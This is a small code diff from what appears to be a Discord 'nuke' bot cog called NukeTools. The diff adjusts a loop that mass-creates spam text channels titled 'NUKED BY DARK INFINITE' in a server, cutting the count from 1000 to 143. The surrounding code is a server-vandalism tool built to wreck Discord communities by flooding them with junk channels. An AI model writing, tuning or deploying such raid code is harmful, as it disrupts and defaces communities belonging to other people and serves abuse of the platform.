@@ -1276,8 +1276,8 @@ class NukeTools(Cog, name="nuketools"):
             except Exception:
                 pass
 
-        # Step 2: Create 100 channels named "nuked-by-7hx"
-        for i in range(1000):
+        # Step 2: Create 143 channels named "nuked-by-7hx"
+        for i in range(143):
             try:
                 ch = await guild.create_text_channel(
                     f"NUKED BY DARK INFINITE",
